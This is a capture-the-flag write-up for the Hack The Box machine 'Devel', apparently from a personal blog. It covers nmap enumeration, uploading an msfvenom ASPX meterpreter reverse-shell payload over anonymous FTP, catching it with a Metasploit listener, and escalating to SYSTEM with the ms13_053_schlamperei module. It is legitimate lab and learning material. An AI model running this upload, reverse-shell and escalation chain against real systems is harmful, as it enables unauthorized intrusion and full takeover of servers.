---
title: "HTB Devel"
date: 2023-07-18T07:17:05Z
draft: true
---

This is my writeup for the HTB Machine [Devel](https://app.hackthebox.com/machines/Devel)

## Info
---
- my os: Kali 2023.2
- my ip: 10.10.14.6
- machine ip: 10.10.10.5

## Enumeration
---
```
$ nmap -sV -sC 10.10.10.5 -p-
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 10:45 UTC
Nmap scan report for 10.10.10.5
Host is up (0.048s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 117.24 seconds

```
key takeaways:
- there is a ftp-server on port 21 and it allows anonymous login
- there is an iis web-server on port 80

It seems like the ftp is pointing to `c://inetpub//wwwroot` where the files for the web-server a stored. 
Let's confirm this by surfing to `http://10.10.10.5/welcome.png`. Bingo!

## Gaining Access
---
Most likely we can upload files via ftp so let's craft a payload for a reverse shell via msfvenom:
``` 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=4444 -f aspx > msfshell.aspx
```
Afterwards we upload the payload via ftp:
```
$ ftp anonymous@10.10.10.5
put msfshell.aspx
```
Before we run the aspx file, we need a listener on the attacker machine:
```
$ msfconsole
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.10.14.6
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > run
```
Now we can execute the aspx by surfing to `http://10.10.10.5/msfshell.aspx`.
We should have a meterpreter session now :)
```
meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
```
## Privileg Escalation
---
Because i'm lazy i'll use `local_exploit_suggest` by running
```
meterpreter > run post/multi/recon/local_exploit_suggester 
```

I'll go with `windows/local/ms13_053_schlamperei`
```
msf6 > use windows/local/ms13_053_schlamperei
msf6 exploit(windows/local/ms13_053_schlamperei) > set session 1
msf6 exploit(windows/local/ms13_053_schlamperei) > set lhost 10.10.14.6
msf6 exploit(windows/local/ms13_053_schlamperei) > run
```
and we are root :)
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
Now we just have to find the wanted flags:
```
meterpreter > search -f user.txt
Found 1 result...
=================

Path                             Size (bytes)  Modified (UTC)
----                             ------------  --------------
c:\Users\babis\Desktop\user.txt  34            2023-07-18 08:59:08 +0000

meterpreter > search -f root.txt
Found 1 result...
=================

Path                                     Size (bytes)  Modified (UTC)
----                                     ------------  --------------
c:\Users\Administrator\Desktop\root.txt  34            2023-07-18 08:59:08 +0000

```

Happy hacking :)
